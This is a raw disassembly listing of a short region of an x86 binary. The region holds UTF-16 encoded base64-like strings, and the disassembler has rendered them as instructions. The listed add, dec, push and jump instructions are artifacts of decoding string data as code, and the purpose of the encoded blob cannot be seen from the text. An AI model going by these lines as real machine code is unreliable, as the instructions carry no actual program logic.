  40b3bb:	00 5a 00             	add    %bl,0x0(%edx)
  40b3be:	6d                   	insl   (%dx),%es:(%edi)
  40b3bf:	00 65 00             	add    %ah,0x0(%ebp)
  40b3c2:	4a                   	dec    %edx
  40b3c3:	00 49 00             	add    %cl,0x0(%ecx)
  40b3c6:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40b3ca:	49                   	dec    %ecx
  40b3cb:	00 51 00             	add    %dl,0x0(%ecx)
  40b3ce:	78 00                	js     0x40b3d0
  40b3d0:	4d                   	dec    %ebp
  40b3d1:	00 67 00             	add    %ah,0x0(%edi)
  40b3d4:	31 00                	xor    %eax,(%eax)
  40b3d6:	69 00 79 00 4b 00    	imul   $0x4b0079,(%eax),%eax
  40b3dc:	5a                   	pop    %edx
  40b3dd:	00 30                	add    %dh,(%eax)
  40b3df:	00 6f 00             	add    %ch,0x0(%edi)
  40b3e2:	62 00                	bound  %eax,(%eax)
  40b3e4:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3e5:	00 52 00             	add    %dl,0x0(%edx)
  40b3e8:	6a 00                	push   $0x0
  40b3ea:	70 00                	jo     0x40b3ec
  40b3ec:	73 00                	jae    0x40b3ee
  40b3ee:	34 00                	xor    $0x0,%al
  40b3f0:	6a 00                	push   $0x0
  40b3f2:	59                   	pop    %ecx
  40b3f3:	00 37                	add    %dh,(%edi)
  40b3f5:	00 48 00             	add    %cl,0x0(%eax)
  40b3f8:	44                   	inc    %esp
  40b3f9:	00 46 00             	add    %al,0x0(%esi)
  40b3fc:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  40b400:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40b403:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
  40b407:	00 63 00             	add    %ah,0x0(%ebx)
  40b40a:	61                   	popa
  40b40b:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  40b40f:	00 6f 00             	add    %ch,0x0(%edi)
  40b412:	56                   	push   %esi
  40b413:	00 56 00             	add    %dl,0x0(%esi)
  40b416:	4a                   	dec    %edx
  40b417:	00 2f                	add    %ch,(%edi)
  40b419:	00 65 00             	add    %ah,0x0(%ebp)
  40b41c:	70 00                	jo     0x40b41e
  40b41e:	48                   	dec    %eax
  40b41f:	00 36                	add    %dh,(%esi)
  40b421:	00 66 00             	add    %ah,0x0(%esi)
  40b424:	47                   	inc    %edi
  40b425:	00 2b                	add    %ch,(%ebx)
  40b427:	00 77 00             	add    %dh,0x0(%edi)
  40b42a:	44                   	inc    %esp
  40b42b:	00 30                	add    %dh,(%eax)
  40b42d:	00 75 00             	add    %dh,0x0(%ebp)
  40b430:	70 00                	jo     0x40b432
  40b432:	4e                   	dec    %esi
  40b433:	00 6d 00             	add    %ch,0x0(%ebp)
  40b436:	2b 00                	sub    (%eax),%eax
  40b438:	74 00                	je     0x40b43a
  40b43a:	6a 00                	push   $0x0
  40b43c:	47                   	inc    %edi
  40b43d:	00 4d 00             	add    %cl,0x0(%ebp)
  40b440:	72 00                	jb     0x40b442
  40b442:	5a                   	pop    %edx
  40b443:	00 71 00             	add    %dh,0x0(%ecx)
  40b446:	6a 00                	push   $0x0
  40b448:	57                   	push   %edi
  40b449:	00 32                	add    %dh,(%edx)
  40b44b:	00 4b 00             	add    %cl,0x0(%ebx)
  40b44e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b44f:	00 67 00             	add    %ah,0x0(%edi)
  40b452:	46                   	inc    %esi
  40b453:	00 67 00             	add    %ah,0x0(%edi)
  40b456:	4f                   	dec    %edi
  40b457:	00 72 00             	add    %dh,0x0(%edx)
  40b45a:	34 00                	xor    $0x0,%al
  40b45c:	37                   	aaa
  40b45d:	00 77 00             	add    %dh,0x0(%edi)
  40b460:	31 00                	xor    %eax,(%eax)
  40b462:	74 00                	je     0x40b464
  40b464:	78 00                	js     0x40b466
  40b466:	34 00                	xor    $0x0,%al
  40b468:	37                   	aaa
  40b469:	00 78 00             	add    %bh,0x0(%eax)
  40b46c:	2b 00                	sub    (%eax),%eax
  40b46e:	2f                   	das
  40b46f:	00 35 00 45 00 55    	add    %dh,0x55004500
  40b475:	00 46 00             	add    %al,0x0(%esi)
  40b478:	64 00 44 00 47       	add    %al,%fs:0x47(%eax,%eax,1)
  40b47d:	00 69 00             	add    %ch,0x0(%ecx)
  40b480:	4c                   	dec    %esp
  40b481:	00 59 00             	add    %bl,0x0(%ecx)
  40b484:	79 00                	jns    0x40b486
  40b486:	41                   	inc    %ecx
  40b487:	00 43 00             	add    %al,0x0(%ebx)
  40b48a:	38 00                	cmp    %al,(%eax)
  40b48c:	43                   	inc    %ebx
  40b48d:	00 6f 00             	add    %ch,0x0(%edi)
  40b490:	73 00                	jae    0x40b492
  40b492:	73 00                	jae    0x40b494
  40b494:	62 00                	bound  %eax,(%eax)
  40b496:	63 00                	arpl   %eax,(%eax)
  40b498:	70 00                	jo     0x40b49a
  40b49a:	37                   	aaa
  40b49b:	00 53 00             	add    %dl,0x0(%ebx)
  40b49e:	65 00 32             	add    %dh,%gs:(%edx)
  40b4a1:	00 46 00             	add    %al,0x0(%esi)
  40b4a4:	7a 00                	jp     0x40b4a6
  40b4a6:	79 00                	jns    0x40b4a8
  40b4a8:	6d                   	insl   (%dx),%es:(%edi)
  40b4a9:	00 52 00             	add    %dl,0x0(%edx)
  40b4ac:	47                   	inc    %edi
  40b4ad:	00 73 00             	add    %dh,0x0(%ebx)
  40b4b0:	32 00                	xor    (%eax),%al
  40b4b2:	55                   	push   %ebp
  40b4b3:	00 78 00             	add    %bh,0x0(%eax)
  40b4b6:	5a                   	pop    %edx
  40b4b7:	00 6a 00             	add    %ch,0x0(%edx)
  40b4ba:	79 00                	jns    0x40b4bc
  40b4bc:	53                   	push   %ebx
  40b4bd:	00 4a 00             	add    %cl,0x0(%edx)
  40b4c0:	65 00 64 00 75       	add    %ah,%gs:0x75(%eax,%eax,1)
  40b4c5:	00 4a 00             	add    %cl,0x0(%edx)
  40b4c8:	53                   	push   %ebx
  40b4c9:	00 6f 00             	add    %ch,0x0(%edi)
  40b4cc:	56                   	push   %esi
  40b4cd:	00 2f                	add    %ch,(%edi)
  40b4cf:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4d2:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40b4d6:	45                   	inc    %ebp
  40b4d7:	00 30                	add    %dh,(%eax)
  40b4d9:	00 4b 00             	add    %cl,0x0(%ebx)
  40b4dc:	68 00 39 00 4c       	push   $0x4c003900
  40b4e1:	00 48 00             	add    %cl,0x0(%eax)
  40b4e4:	48                   	dec    %eax
  40b4e5:	00 56 00             	add    %dl,0x0(%esi)
  40b4e8:	4d                   	dec    %ebp
  40b4e9:	00 49 00             	add    %cl,0x0(%ecx)
  40b4ec:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40b4f0:	74 00                	je     0x40b4f2
  40b4f2:	6a 00                	push   $0x0
  40b4f4:	36 00 30             	add    %dh,%ss:(%eax)
  40b4f7:	00 57 00             	add    %dl,0x0(%edi)
  40b4fa:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40b4fe:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40b502:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40b506:	4d                   	dec    %ebp
  40b507:	00 42 00             	add    %al,0x0(%edx)
  40b50a:	50                   	push   %eax
  40b50b:	00 2b                	add    %ch,(%ebx)
  40b50d:	00 6e 00             	add    %ch,0x0(%esi)
  40b510:	39 00                	cmp    %eax,(%eax)
  40b512:	38 00                	cmp    %al,(%eax)
  40b514:	4c                   	dec    %esp
  40b515:	00 63 00             	add    %ah,0x0(%ebx)
  40b518:	37                   	aaa
  40b519:	00 72 00             	add    %dh,0x0(%edx)
  40b51c:	46                   	inc    %esi
  40b51d:	00 6c 00 46          	add    %ch,0x46(%eax,%eax,1)
  40b521:	00 76 00             	add    %dh,0x0(%esi)
  40b524:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  40b528:	76 00                	jbe    0x40b52a
  40b52a:	32 00                	xor    (%eax),%al
  40b52c:	46                   	inc    %esi
  40b52d:	00 63 00             	add    %ah,0x0(%ebx)
  40b530:	73 00                	jae    0x40b532
  40b532:	33 00                	xor    (%eax),%eax
  40b534:	78 00                	js     0x40b536
  40b536:	59                   	pop    %ecx
  40b537:	00 67 00             	add    %ah,0x0(%edi)
  40b53a:	48                   	dec    %eax
  40b53b:	00 47 00             	add    %al,0x0(%edi)
  40b53e:	44                   	inc    %esp
  40b53f:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  40b543:	00 37                	add    %dh,(%edi)
  40b545:	00 7a 00             	add    %bh,0x0(%edx)
  40b548:	59                   	pop    %ecx
  40b549:	00 4d 00             	add    %cl,0x0(%ebp)
  40b54c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b54d:	00 65 00             	add    %ah,0x0(%ebp)
  40b550:	47                   	inc    %edi
  40b551:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b554:	70 00                	jo     0x40b556
  40b556:	54                   	push   %esp
  40b557:	00 42 00             	add    %al,0x0(%edx)
  40b55a:	73 00                	jae    0x40b55c
  40b55c:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  40b560:	2f                   	das
  40b561:	00 70 00             	add    %dh,0x0(%eax)
  40b564:	55                   	push   %ebp
  40b565:	00 61 00             	add    %ah,0x0(%ecx)
  40b568:	6c                   	insb   (%dx),%es:(%edi)
  40b569:	00 43 00             	add    %al,0x0(%ebx)
  40b56c:	74 00                	je     0x40b56e
  40b56e:	4a                   	dec    %edx
  40b56f:	00 54 00 35          	add    %dl,0x35(%eax,%eax,1)
  40b573:	00 70 00             	add    %dh,0x0(%eax)
  40b576:	2f                   	das
  40b577:	00 4a 00             	add    %cl,0x0(%edx)
  40b57a:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40b57e:	4b                   	dec    %ebx
  40b57f:	00 55 00             	add    %dl,0x0(%ebp)
  40b582:	6b 00 55             	imul   $0x55,(%eax),%eax
  40b585:	00 46 00             	add    %al,0x0(%esi)
  40b588:	32 00                	xor    (%eax),%al
  40b58a:	77 00                	ja     0x40b58c
  40b58c:	6b 00 67             	imul   $0x67,(%eax),%eax
  40b58f:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40b593:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b597:	00 69 00             	add    %ch,0x0(%ecx)
  40b59a:	4f                   	dec    %edi
  40b59b:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  40b59f:	00 51 00             	add    %dl,0x0(%ecx)
  40b5a2:	63 00                	arpl   %eax,(%eax)
  40b5a4:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5a5:	00 67 00             	add    %ah,0x0(%edi)
  40b5a8:	31 00                	xor    %eax,(%eax)
  40b5aa:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5ab:	00 39                	add    %bh,(%ecx)
  40b5ad:	00 57 00             	add    %dl,0x0(%edi)
  40b5b0:	55                   	push   %ebp
  40b5b1:	00 32                	add    %dh,(%edx)
  40b5b3:	00 67 00             	add    %ah,0x0(%edi)
  40b5b6:	72 00                	jb     0x40b5b8
  40b5b8:	4a                   	dec    %edx
  40b5b9:	00 61 00             	add    %ah,0x0(%ecx)
  40b5bc:	59                   	pop    %ecx
  40b5bd:	00 36                	add    %dh,(%esi)
  40b5bf:	00 4b 00             	add    %cl,0x0(%ebx)
  40b5c2:	76 00                	jbe    0x40b5c4
  40b5c4:	59                   	pop    %ecx
  40b5c5:	00 62 00             	add    %ah,0x0(%edx)
  40b5c8:	59                   	pop    %ecx
  40b5c9:	00 4f 00             	add    %cl,0x0(%edi)
  40b5cc:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5cd:	00 35 00 34 00 5a    	add    %dh,0x5a003400
  40b5d3:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
  40b5d7:	00 63 00             	add    %ah,0x0(%ebx)
  40b5da:	2f                   	das
  40b5db:	00 68 00             	add    %ch,0x0(%eax)
  40b5de:	57                   	push   %edi
  40b5df:	00 37                	add    %dh,(%edi)
  40b5e1:	00 79 00             	add    %bh,0x0(%ecx)
  40b5e4:	52                   	push   %edx
  40b5e5:	00 56 00             	add    %dl,0x0(%esi)
  40b5e8:	66 00 74 00 73       	data16 add %dh,0x73(%eax,%eax,1)
  40b5ed:	00 79 00             	add    %bh,0x0(%ecx)
  40b5f0:	50                   	push   %eax
  40b5f1:	00 52 00             	add    %dl,0x0(%edx)
  40b5f4:	42                   	inc    %edx
  40b5f5:	00 68 00             	add    %ch,0x0(%eax)
  40b5f8:	67 00 2f             	add    %ch,(%bx)
  40b5fb:	00 44 00 48          	add    %al,0x48(%eax,%eax,1)
  40b5ff:	00 33                	add    %dh,(%ebx)
  40b601:	00 30                	add    %dh,(%eax)
  40b603:	00 47 00             	add    %al,0x0(%edi)
  40b606:	2b 00                	sub    (%eax),%eax
  40b608:	69 00 36 00 50 00    	imul   $0x500036,(%eax),%eax
  40b60e:	58                   	pop    %eax
  40b60f:	00 45 00             	add    %al,0x0(%ebp)
  40b612:	79 00                	jns    0x40b614
  40b614:	47                   	inc    %edi
  40b615:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40b619:	00 58 00             	add    %bl,0x0(%eax)
  40b61c:	73 00                	jae    0x40b61e
  40b61e:	78 00                	js     0x40b620
  40b620:	69 00 61 00 46 00    	imul   $0x460061,(%eax),%eax
  40b626:	77 00                	ja     0x40b628
  40b628:	79 00                	jns    0x40b62a
  40b62a:	68 00 4f 00 43       	push   $0x43004f00
  40b62f:	00 49 00             	add    %cl,0x0(%ecx)
  40b632:	4a                   	dec    %edx
  40b633:	00 73 00             	add    %dh,0x0(%ebx)
  40b636:	50                   	push   %eax
  40b637:	00 48 00             	add    %cl,0x0(%eax)
  40b63a:	68 00 4b 00 71       	push   $0x71004b00
  40b63f:	00 4e 00             	add    %cl,0x0(%esi)
  40b642:	77 00                	ja     0x40b644
  40b644:	56                   	push   %esi
  40b645:	00 73 00             	add    %dh,0x0(%ebx)
  40b648:	50                   	push   %eax
  40b649:	00 52 00             	add    %dl,0x0(%edx)
  40b64c:	33 00                	xor    (%eax),%eax
  40b64e:	43                   	inc    %ebx
  40b64f:	00 32                	add    %dh,(%edx)
  40b651:	00 42 00             	add    %al,0x0(%edx)
  40b654:	6e                   	outsb  %ds:(%esi),(%dx)
  40b655:	00 69 00             	add    %ch,0x0(%ecx)
  40b658:	71 00                	jno    0x40b65a
  40b65a:	53                   	push   %ebx
  40b65b:	00 6e 00             	add    %ch,0x0(%esi)
  40b65e:	55                   	push   %ebp
  40b65f:	00 2f                	add    %ch,(%edi)
  40b661:	00 41 00             	add    %al,0x0(%ecx)
  40b664:	71 00                	jno    0x40b666
  40b666:	52                   	push   %edx
  40b667:	00 4a 00             	add    %cl,0x0(%edx)
  40b66a:	71 00                	jno    0x40b66c
  40b66c:	37                   	aaa
  40b66d:	00 79 00             	add    %bh,0x0(%ecx)
  40b670:	6d                   	insl   (%dx),%es:(%edi)
  40b671:	00 7a 00             	add    %bh,0x0(%edx)
  40b674:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b678:	51                   	push   %ecx
  40b679:	00 30                	add    %dh,(%eax)
  40b67b:	00 48 00             	add    %cl,0x0(%eax)
  40b67e:	30 00                	xor    %al,(%eax)
  40b680:	3d 00 00 87 b1       	cmp    $0xb1870000,%eax
  40b685:	30 00                	xor    %al,(%eax)
  40b687:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  40b68b:	31 00                	xor    %eax,(%eax)
  40b68d:	50                   	push   %eax
  40b68e:	00 4b 00             	add    %cl,0x0(%ebx)
  40b691:	52                   	push   %edx
  40b692:	00 4d 00             	add    %cl,0x0(%ebp)
  40b695:	6c                   	insb   (%dx),%es:(%edi)
  40b696:	00 71 00             	add    %dh,0x0(%ecx)
  40b699:	38 00                	cmp    %al,(%eax)
  40b69b:	55                   	push   %ebp
  40b69c:	00 2b                	add    %ch,(%ebx)
  40b69e:	00 58 00             	add    %bl,0x0(%eax)
  40b6a1:	61                   	popa
  40b6a2:	00 78 00             	add    %bh,0x0(%eax)
  40b6a5:	45                   	inc    %ebp
  40b6a6:	00 6e 00             	add    %ch,0x0(%esi)
  40b6a9:	75 00                	jne    0x40b6ab
  40b6ab:	2b 00                	sub    (%eax),%eax
  40b6ad:	6a 00                	push   $0x0
  40b6af:	31 00                	xor    %eax,(%eax)
  40b6b1:	7a 00                	jp     0x40b6b3
  40b6b3:	4c                   	dec    %esp
  40b6b4:	00 30                	add    %dh,(%eax)
  40b6b6:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b6b9:	70 00                	jo     0x40b6bb
  40b6bb:	35 00 6c 00 42       	xor    $0x42006c00,%eax
  40b6c0:	00 70 00             	add    %dh,0x0(%eax)
  40b6c3:	70 00                	jo     0x40b6c5
  40b6c5:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
  40b6c9:	52                   	push   %edx
  40b6ca:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
  40b6ce:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b6d1:	43                   	inc    %ebx
  40b6d2:	00 31                	add    %dh,(%ecx)
  40b6d4:	00 73 00             	add    %dh,0x0(%ebx)
  40b6d7:	4d                   	dec    %ebp
  40b6d8:	00 76 00             	add    %dh,0x0(%esi)
  40b6db:	75 00                	jne    0x40b6dd
  40b6dd:	35 00 4f 00 49       	xor    $0x49004f00,%eax
  40b6e2:	00 6e 00             	add    %ch,0x0(%esi)
  40b6e5:	5a                   	pop    %edx
  40b6e6:	00 66 00             	add    %ah,0x0(%esi)
  40b6e9:	43                   	inc    %ebx
  40b6ea:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b6ed:	53                   	push   %ebx
  40b6ee:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  40b6f2:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  40b6f6:	00 45 00             	add    %al,0x0(%ebp)
  40b6f9:	76 00                	jbe    0x40b6fb
  40b6fb:	72 00                	jb     0x40b6fd
  40b6fd:	6a 00                	push   $0x0
  40b6ff:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40b703:	71 00                	jno    0x40b705
  40b705:	6c                   	insb   (%dx),%es:(%edi)
  40b706:	00 73 00             	add    %dh,0x0(%ebx)
  40b709:	6d                   	insl   (%dx),%es:(%edi)
  40b70a:	00 69 00             	add    %ch,0x0(%ecx)
  40b70d:	55                   	push   %ebp
  40b70e:	00 72 00             	add    %dh,0x0(%edx)
  40b711:	79 00                	jns    0x40b713
  40b713:	61                   	popa
  40b714:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  40b718:	00 62 00             	add    %ah,0x0(%edx)
  40b71b:	44                   	inc    %esp
  40b71c:	00 33                	add    %dh,(%ebx)
  40b71e:	00 73 00             	add    %dh,0x0(%ebx)
  40b721:	6a 00                	push   $0x0
  40b723:	30 00                	xor    %al,(%eax)
  40b725:	6a 00                	push   $0x0
  40b727:	67 00 31             	add    %dh,(%bx,%di)
  40b72a:	00 47 00             	add    %al,0x0(%edi)
  40b72d:	75 00                	jne    0x40b72f
  40b72f:	38 00                	cmp    %al,(%eax)
  40b731:	4d                   	dec    %ebp
  40b732:	00 36                	add    %dh,(%esi)
  40b734:	00 6e 00             	add    %ch,0x0(%esi)
  40b737:	34 00                	xor    $0x0,%al
  40b739:	50                   	push   %eax
  40b73a:	00 41 00             	add    %al,0x0(%ecx)
  40b73d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b73e:	00 72 00             	add    %dh,0x0(%edx)
  40b741:	41                   	inc    %ecx
  40b742:	00 2f                	add    %ch,(%edi)
  40b744:	00 32                	add    %dh,(%edx)
  40b746:	00 31                	add    %dh,(%ecx)
  40b748:	00 79 00             	add    %bh,0x0(%ecx)
  40b74b:	39 00                	cmp    %eax,(%eax)
  40b74d:	77 00                	ja     0x40b74f
  40b74f:	56                   	push   %esi
  40b750:	00 33                	add    %dh,(%ebx)
  40b752:	00 66 00             	add    %ah,0x0(%esi)
  40b755:	4e                   	dec    %esi
  40b756:	00 7a 00             	add    %bh,0x0(%edx)
  40b759:	4c                   	dec    %esp
  40b75a:	00 59 00             	add    %bl,0x0(%ecx)
  40b75d:	49                   	dec    %ecx
  40b75e:	00 33                	add    %dh,(%ebx)
  40b760:	00 4b 00             	add    %cl,0x0(%ebx)
  40b763:	39 00                	cmp    %eax,(%eax)
  40b765:	38 00                	cmp    %al,(%eax)
  40b767:	68 00 79 00 45       	push   $0x45007900
  40b76c:	00 62 00             	add    %ah,0x0(%edx)
  40b76f:	76 00                	jbe    0x40b771
  40b771:	6a 00                	push   $0x0
  40b773:	37                   	aaa
  40b774:	00 36                	add    %dh,(%esi)
  40b776:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
  40b77a:	00 46 00             	add    %al,0x0(%esi)
  40b77d:	42                   	inc    %edx
  40b77e:	00 61 00             	add    %ah,0x0(%ecx)
  40b781:	58                   	pop    %eax
  40b782:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
  40b786:	00 42 00             	add    %al,0x0(%edx)
  40b789:	73 00                	jae    0x40b78b
  40b78b:	57                   	push   %edi
  40b78c:	00 46 00             	add    %al,0x0(%esi)
  40b78f:	66 00 42 00          	data16 add %al,0x0(%edx)
  40b793:	74 00                	je     0x40b795
  40b795:	49                   	dec    %ecx
  40b796:	00 2f                	add    %ch,(%edi)
  40b798:	00 5a 00             	add    %bl,0x0(%edx)
  40b79b:	66 00 70 00          	data16 add %dh,0x0(%eax)
  40b79f:	55                   	push   %ebp
  40b7a0:	00 78 00             	add    %bh,0x0(%eax)
  40b7a3:	42                   	inc    %edx
  40b7a4:	00 53 00             	add    %dl,0x0(%ebx)
  40b7a7:	53                   	push   %ebx
  40b7a8:	00 70 00             	add    %dh,0x0(%eax)
  40b7ab:	55                   	push   %ebp
  40b7ac:	00 76 00             	add    %dh,0x0(%esi)
  40b7af:	6c                   	insb   (%dx),%es:(%edi)
  40b7b0:	00 33                	add    %dh,(%ebx)
  40b7b2:	00 77 00             	add    %dh,0x0(%edi)
  40b7b5:	68 00 68 00 57       	push   $0x57006800
  40b7ba:	00 59 00             	add    %bl,0x0(%ecx)
  40b7bd:	33 00                	xor    (%eax),%eax
  40b7bf:	78 00                	js     0x40b7c1
  40b7c1:	77 00                	ja     0x40b7c3
  40b7c3:	46                   	inc    %esi
  40b7c4:	00 4e 00             	add    %cl,0x0(%esi)
  40b7c7:	71 00                	jno    0x40b7c9
  40b7c9:	62 00                	bound  %eax,(%eax)
  40b7cb:	62 00                	bound  %eax,(%eax)
  40b7cd:	69 00 68 00 34 00    	imul   $0x340068,(%eax),%eax
  40b7d3:	31 00                	xor    %eax,(%eax)
  40b7d5:	79 00                	jns    0x40b7d7
  40b7d7:	2b 00                	sub    (%eax),%eax
  40b7d9:	69 00 6a 00 49 00    	imul   $0x49006a,(%eax),%eax
  40b7df:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7e0:	00 76 00             	add    %dh,0x0(%esi)
  40b7e3:	73 00                	jae    0x40b7e5
  40b7e5:	69 00 6f 00 56 00    	imul   $0x56006f,(%eax),%eax
  40b7eb:	7a 00                	jp     0x40b7ed
  40b7ed:	52                   	push   %edx
  40b7ee:	00 47 00             	add    %al,0x0(%edi)
  40b7f1:	6d                   	insl   (%dx),%es:(%edi)
  40b7f2:	00 38                	add    %bh,(%eax)
  40b7f4:	00 52 00             	add    %dl,0x0(%edx)
  40b7f7:	47                   	inc    %edi
  40b7f8:	00 48 00             	add    %cl,0x0(%eax)
  40b7fb:	41                   	inc    %ecx
  40b7fc:	00 49 00             	add    %cl,0x0(%ecx)
  40b7ff:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40b803:	41                   	inc    %ecx
  40b804:	00 33                	add    %dh,(%ebx)
  40b806:	00 56 00             	add    %dl,0x0(%esi)
  40b809:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40b80d:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40b811:	71 00                	jno    0x40b813
  40b813:	6c                   	insb   (%dx),%es:(%edi)
  40b814:	00 2b                	add    %ch,(%ebx)
  40b816:	00 49 00             	add    %cl,0x0(%ecx)
  40b819:	31 00                	xor    %eax,(%eax)
  40b81b:	73 00                	jae    0x40b81d
  40b81d:	58                   	pop    %eax
  40b81e:	00 46 00             	add    %al,0x0(%esi)
  40b821:	74 00                	je     0x40b823
  40b823:	4f                   	dec    %edi
  40b824:	00 47 00             	add    %al,0x0(%edi)
  40b827:	68 00 39 00 4a       	push   $0x4a003900
  40b82c:	00 67 00             	add    %ah,0x0(%edi)
  40b82f:	50                   	push   %eax
  40b830:	00 72 00             	add    %dh,0x0(%edx)
  40b833:	48                   	dec    %eax
  40b834:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  40b838:	00 61 00             	add    %ah,0x0(%ecx)
  40b83b:	42                   	inc    %edx
  40b83c:	00 73 00             	add    %dh,0x0(%ebx)
  40b83f:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40b843:	66 00 44 00 73       	data16 add %al,0x73(%eax,%eax,1)
  40b848:	00 50 00             	add    %dl,0x0(%eax)
  40b84b:	61                   	popa
  40b84c:	00 37                	add    %dh,(%edi)
  40b84e:	00 4b 00             	add    %cl,0x0(%ebx)
  40b851:	30 00                	xor    %al,(%eax)
  40b853:	46                   	inc    %esi
  40b854:	00 65 00             	add    %ah,0x0(%ebp)
  40b857:	42                   	inc    %edx
  40b858:	00 66 00             	add    %ah,0x0(%esi)
  40b85b:	4c                   	dec    %esp
  40b85c:	00 30                	add    %dh,(%eax)
  40b85e:	00 65 00             	add    %ah,0x0(%ebp)
  40b861:	78 00                	js     0x40b863
  40b863:	4c                   	dec    %esp
  40b864:	00 33                	add    %dh,(%ebx)
  40b866:	00 4f 00             	add    %cl,0x0(%edi)
  40b869:	34 00                	xor    $0x0,%al
  40b86b:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  40b86f:	43                   	inc    %ebx
  40b870:	00 47 00             	add    %al,0x0(%edi)
  40b873:	4d                   	dec    %ebp
  40b874:	00 4f 00             	add    %cl,0x0(%edi)
  40b877:	6c                   	insb   (%dx),%es:(%edi)
  40b878:	00 41 00             	add    %al,0x0(%ecx)
  40b87b:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b87f:	76 00                	jbe    0x40b881
  40b881:	33 00                	xor    (%eax),%eax
  40b883:	7a 00                	jp     0x40b885
  40b885:	74 00                	je     0x40b887
  40b887:	30 00                	xor    %al,(%eax)
  40b889:	39 00                	cmp    %eax,(%eax)
  40b88b:	63 00                	arpl   %eax,(%eax)
  40b88d:	42                   	inc    %edx
  40b88e:	00 4e 00             	add    %cl,0x0(%esi)
  40b891:	4a                   	dec    %edx
  40b892:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
  40b896:	00 6b 00             	add    %ch,0x0(%ebx)
  40b899:	74 00                	je     0x40b89b
  40b89b:	42                   	inc    %edx
  40b89c:	00 2f                	add    %ch,(%edi)
  40b89e:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
  40b8a2:	00 30                	add    %dh,(%eax)
  40b8a4:	00 46 00             	add    %al,0x0(%esi)
  40b8a7:	4e                   	dec    %esi
  40b8a8:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b8ab:	77 00                	ja     0x40b8ad
  40b8ad:	4f                   	dec    %edi
  40b8ae:	00 68 00             	add    %ch,0x0(%eax)
  40b8b1:	4e                   	dec    %esi
  40b8b2:	00 42 00             	add    %al,0x0(%edx)
  40b8b5:	69 00 66 00 48 00    	imul   $0x480066,(%eax),%eax
  40b8bb:	6d                   	insl   (%dx),%es:(%edi)
  40b8bc:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
  40b8c0:	00 4f 00             	add    %cl,0x0(%edi)
  40b8c3:	39 00                	cmp    %eax,(%eax)
  40b8c5:	30 00                	xor    %al,(%eax)
  40b8c7:	49                   	dec    %ecx
  40b8c8:	00 4b 00             	add    %cl,0x0(%ebx)
  40b8cb:	76 00                	jbe    0x40b8cd
  40b8cd:	59                   	pop    %ecx
  40b8ce:	00 48 00             	add    %cl,0x0(%eax)
  40b8d1:	79 00                	jns    0x40b8d3
  40b8d3:	65 00 44 00 45       	add    %al,%gs:0x45(%eax,%eax,1)
  40b8d8:	00 57 00             	add    %dl,0x0(%edi)
  40b8db:	2f                   	das
  40b8dc:	00 72 00             	add    %dh,0x0(%edx)
  40b8df:	51                   	push   %ecx
  40b8e0:	00 78 00             	add    %bh,0x0(%eax)
  40b8e3:	42                   	inc    %edx
  40b8e4:	00 51 00             	add    %dl,0x0(%ecx)
  40b8e7:	57                   	push   %edi
  40b8e8:	00 37                	add    %dh,(%edi)
  40b8ea:	00 30                	add    %dh,(%eax)
  40b8ec:	00 6e 00             	add    %ch,0x0(%esi)
  40b8ef:	59                   	pop    %ecx
  40b8f0:	00 2b                	add    %ch,(%ebx)
  40b8f2:	00 45 00             	add    %al,0x0(%ebp)
  40b8f5:	49                   	dec    %ecx
  40b8f6:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b8f9:	52                   	push   %edx
  40b8fa:	00 6f 00             	add    %ch,0x0(%edi)
  40b8fd:	74 00                	je     0x40b8ff
  40b8ff:	4f                   	dec    %edi
  40b900:	00 73 00             	add    %dh,0x0(%ebx)
  40b903:	54                   	push   %esp
  40b904:	00 77 00             	add    %dh,0x0(%edi)
  40b907:	6a 00                	push   $0x0
